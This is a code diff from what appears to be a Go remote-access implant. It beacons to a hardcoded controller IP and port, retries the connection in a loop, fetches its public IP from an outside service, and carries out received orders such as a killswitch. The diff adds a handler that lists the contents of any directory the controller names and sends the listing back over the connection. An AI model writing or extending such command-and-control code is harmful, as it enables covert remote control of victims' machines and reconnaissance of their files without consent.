@@ -19,7 +19,7 @@ var (
 	RemoteIP            string        = "192.168.1.181"
 	RemotePort          string        = "1302"
 	Remote_IP_Requester string        = "https://ip.bulgariu.xyz"
-	TimeoutRate         time.Duration = 5
+	retryRate           time.Duration = 5
 )
 
 func main() {
@@ -28,7 +28,7 @@ func main() {
 		if err := start(); err != nil {
 			log.Print(err)
 		}
-		time.Sleep(time.Second * TimeoutRate)
+		time.Sleep(time.Second * retryRate)
 	}
 }
 
@@ -52,7 +52,7 @@ func start() error {
 }
 
 func getIP() (string, error) {
-	res, err := http.Get("https://ip.bulgariu.xyz")
+	res, err := http.Get(Remote_IP_Requester)
 	if err != nil {
 		log.Printf("Error happened GETting IP: %v\n", err)
 		return "", nil
@@ -126,11 +126,37 @@ func awaitInstructions(conn net.Conn) error {
 	///////////////////////////////
 	case inst.IsKillswitch == true:
 		os.Exit(0)
+	///////////////////////////////
+	case inst.IsListFiles == true:
+		listFiles(conn, inst.Path)
+	///////////////////////////////
 	default:
 		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
 	}
 	///////////////////////////////
 	return nil
+}
+
+func listFiles(conn net.Conn, rpath string) {
+	path := strings.TrimRight(rpath, "/") + "/"
+	if rpath == "/" {
+		path = "/"
+	}
+	list, _ := os.ReadDir(path)
+
+	newList := FileList{}
+	for _, v := range list {
+		item := Item{
+			Name:     v.Name(),
+			FullPath: path + v.Name(),
+			IsFolder: v.IsDir(),
+		}
+		newList.File = append(newList.File, item)
+	}
+	sendMessage(Response{
+		Successful: true,
+		FileList:   newList,
+	}, conn)
 }
 
 func Heartbeat(conn net.Conn) error {
